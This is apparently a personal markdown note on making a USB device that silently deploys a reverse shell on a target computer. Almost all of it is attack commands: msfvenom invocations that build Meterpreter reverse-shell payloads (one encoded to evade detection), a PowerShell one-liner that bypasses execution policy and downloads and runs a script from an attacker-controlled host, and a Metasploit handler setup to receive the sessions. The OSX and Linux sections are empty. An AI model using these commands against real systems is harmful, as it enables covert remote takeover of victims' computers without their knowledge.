# Objective

Create a usb which deploys a reverse shell in a computer without user interaction and as fast as possible

# Payload creation

## Windows

For creating a 32-bit payload that works in both 32-bit and 64-bit windows:

```bash
msfvenom -p windows/meterpreter/reverse_tcp -f psh LHOST="<IP>" LPORT=1337 -o <filename.ps1>

# Generate .exe
msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST="<IP>" 10.0.0.101 LPORT=1337 -o asdf.exe

# Generate .ps1
msfvenom –p windows/meterpreter_reverse_http -f psh -a x86 --platform Windows LHOST=10.0.0.101 LPORT=1337 -e x86/shikata_ga_nai > asdf.ps1

```

For using it in Windows:

```bash
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe

C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -NoExit -File asdf.ps1

# This is the one who works
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -NoExit -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.0.0.101:3333/asdf.ps1'))"
```

## OSX

## Linux

# Handler

```bash
msfconsole
use exploit/multi/Handler
set lhost <ip>
set lport 1337
exploit
# sessions -l
```

# Links

[https://getpocket.com/a/read/1858845501](https://getpocket.com/a/read/1858845501)
